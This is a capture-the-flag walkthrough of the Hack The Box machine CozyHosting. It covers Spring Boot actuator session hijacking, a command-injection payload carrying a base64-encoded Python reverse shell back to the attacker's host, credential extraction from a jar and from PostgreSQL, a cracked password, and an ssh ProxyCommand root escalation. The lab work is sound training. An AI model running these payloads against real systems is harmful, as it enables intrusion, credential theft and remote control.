---
categories: [hackthebox , walkthrough]
tags: [Command  Injection, GTFObin, PostgreSQL, Session Hijacking, springframework]
image:
  path: /Vulnhub-Files/img/CozyHosting/Untitled.png
  alt: CozyHosting Machine 🖥️
---


## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 10.10.11.230
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 14:37 IST
Nmap scan report for 10.10.11.230
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration ⤵️

Lets check the port 80 after changing its hosts file and giving it a domain name →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%201.png)

I also got the login page but it is not vulnerable so I moved on to another pages →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%202.png)

I found this error on this page →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%203.png)

After searching on web about this error I got this page →

[https://springhow.com/this-application-has-no-explicit-mapping-for-error/](https://springhow.com/this-application-has-no-explicit-mapping-for-error/)

here it is using org.springframework.boot so I used this into the directory traversal,

Lets see the directory traversal of Spring Boot file system →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$ feroxbuster -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -t 100 -k --depth 2 -x php,html,txt,log -C 404,403 -o ferox_spring_boot

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_spring_boot
 💲  Extensions            │ [php, html, txt, log]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l        1w      242c http://cozyhosting.htb/actuator/sessions
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
[####################] - 5s       850/850     0s      found:30      errors:0      
[####################] - 4s       565/565     127/s   http://cozyhosting.htb/                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$
```

And I got these any files so lets dig in →

I got some cookies values from this site `/actuator/sessions` →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%204.png)

Now lets access the admin page and change our cookies value →

Since the value of cookies are changing every min or so , that why load the new values and copy it and paste it into the cookies section then load `/admin` site again ⤵️ 

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%205.png)

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%206.png)

Now after refresing the page I got this ⤵️

 

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%207.png)

Now The username and hostname indicates the value for SSH login credentials so lets bypass this with some command injection and since it detects spaces so I used the simple reverese shell code which will be base64 decoded and executed as bash here it is →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%208.png)

Now lets insert our payload here →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%209.png)

```bash
# payload ⤵️
;echo${IFS}cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYxIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw|base64${IFS}-d|bash${IFS};#

# base64 encoded value ⤵️ 
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$ echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYxIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw' |base64 -d 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Now when I executed it I got the response as reverse shell on nc lisener →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.61] from (UNKNOWN) [10.10.11.230] 39534
app@cozyhosting:/app$ ls
ls
cloudhosting-0.0.1.jar
app@cozyhosting:/app$
```

I downloaded this file and extracted that file and I got this credentials ⤵️ 

```bash
┌──(kali㉿kali)-[~/…/HTB/CozyHosting/BOOT-INF/classes]
└─$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Lets access the postgresql now →

```bash
app@cozyhosting:/app$ psql -U postgres -W -h localhost -d cozyhosting
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
cozyhosting=#
cozyhosting-# \l

List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

cozyhosting-# \dt

List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting-# \d users

Table "public.users"
  Column  |          Type          | Collation | Nullable | Default 
----------+------------------------+-----------+----------+---------
 name     | character varying(50)  |           | not null | 
 password | character varying(100) |           | not null | 
 role     | role                   |           |          | 
Indexes:
    "users_pkey" PRIMARY KEY, btree (name)
Referenced by:
    TABLE "hosts" CONSTRAINT "hosts_username_fkey" FOREIGN KEY (username) REFERENCES users(name)

cozyhosting=# select * from users;

name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

```

Now with hashcat Tool I cracked the password of admin that is ⤵️ 

```bash
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

Now its time for SSH login →

## SSH Shell ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
└─$ ssh josh@cozyhosting.htb 
The authenticity of host 'cozyhosting.htb (10.10.11.230)' cant be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cozyhosting.htb' (ED25519) to the list of known hosts.
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 29 09:03:32 AM UTC 2023

  System load:           0.39794921875
  Usage of /:            53.9% of 5.42GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             264
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.88
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f0de

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$
```

Now lets see how this user can lead me to root user →

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:~$
```

Now with GTFObin help I can exploit this one →

![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%2010.png)

```bash
josh@cozyhosting:~$ sudo -u root ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/home/josh# whoami
root
root@cozyhosting:/home/josh# id
uid=0(root) gid=0(root) groups=0(root)
root@cozyhosting:/home/josh# cd /root
root@cozyhosting:~# ls -al
total 40
drwx------  5 root root 4096 Aug 14 13:37 .
drwxr-xr-x 19 root root 4096 Aug 14 14:11 ..
lrwxrwxrwx  1 root root    9 May 18 15:00 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Aug  8 10:10 .cache
-rw-------  1 root root   56 Aug 14 13:37 .lesshst
drwxr-xr-x  3 root root 4096 May 11 19:21 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
lrwxrwxrwx  1 root root    9 May 18 15:00 .psql_history -> /dev/null
-rw-r-----  1 root root   33 Sep 10 08:39 root.txt
drwx------  2 root root 4096 May  9 18:49 .ssh
-rw-r--r--  1 root root   39 Aug  8 10:19 .vimrc
root@cozyhosting:~# cat root.txt
c53f157a8912c99b2e83fb9e54578d1d
root@cozyhosting:~# cat /home/josh/user.txt
ecc16918dd79dc8a3957ff9fa3ef914e
root@cozyhosting:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:fd:e8 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.230/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:fde8/64 scope global dynamic mngtmpaddr 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::250:56ff:feb9:fde8/64 scope link 
       valid_lft forever preferred_lft forever
root@cozyhosting:~#
```